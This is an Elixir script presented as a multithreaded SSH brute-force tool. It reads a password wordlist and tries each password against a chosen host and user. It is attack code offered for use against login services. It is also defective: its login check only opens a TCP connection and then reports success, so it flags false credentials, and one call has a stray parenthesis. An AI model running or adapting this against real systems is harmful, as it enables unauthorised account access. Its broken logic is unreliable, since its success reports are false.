defmodule SSHBrute do
  def main(args) do
    {opts, _, _} = OptionParser.parse(args,
      switches: [host: :string, port: :integer, user: :string, wordlist: :string, threads: :integer, timeout: :integer],
      aliases: [h: :host, p: :port, u: :user, w: :wordlist, t: :threads, T: :timeout]
    )

    host = opts[:host] || IO.puts("Missing required: --host") || System.halt(1)
    port = opts[:port] || 22
    user = opts[:user] || IO.puts("Missing required: --user") || System.halt(1)
    wordlist = opts[:wordlist] || IO.puts("Missing required: --wordlist") || System.halt(1)
    threads = opts[:threads] || 4
    timeout = opts[:timeout] || 10

    IO.puts("Starting SSH brute force on #{host}:#{port}")
    IO.puts("Target: #{user}")
    IO.puts("Threads: #{threads}")
    IO.puts("Timeout: #{timeout} seconds")
    IO.puts("----------------------------------------")

    # Load wordlist
    passwords = File.read!(wordlist) |> String.split("\n", trim: true)
    IO.puts("Loaded #{length(passwords)} passwords")

    # Create task supervisor
    children = [
      {Task.Supervisor, name: SSHBrute.TaskSupervisor}
    ]
    Supervisor.start_link(children, strategy: :one_for_one)

    # Split passwords among tasks
    chunk_size = div(length(passwords), threads)
    chunks = Enum.chunk_every(passwords, chunk_size)

    # Create tasks
    tasks = Enum.map(chunks, fn chunk ->
      Task.Supervisor.async(SSHBrute.TaskSupervisor, fn ->
        worker(host, port, user, chunk, timeout)
      end)
    )

    # Wait for results
    results = Task.yield_many(tasks, :infinity)

    # Check results
    case Enum.find(results, fn {_, {:ok, result}} -> result != nil end) do
      {_, {:ok, result}} ->
        IO.puts(result)
        System.halt(0)
      _ ->
        IO.puts("No valid credentials found")
    end
  end

  defp worker(host, port, user, passwords, timeout) do
    Enum.find_value(passwords, fn password ->
      case try_ssh(host, port, user, password, timeout) do
        true -> "[SUCCESS] #{user}:#{password}"
        false -> nil
      end
    end)
  end

  defp try_ssh(host, port, user, password, timeout) do
    # In a real implementation, you'd use an SSH library
    # This is a simplified version
    {:ok, socket} = :gen_tcp.connect(to_charlist(host), port, [:binary, active: false, packet: 0, timeout: timeout * 1000])
    :gen_tcp.close(socket)
    true
  rescue
    _ -> false
  end
end

SSHBrute.main(System.argv())
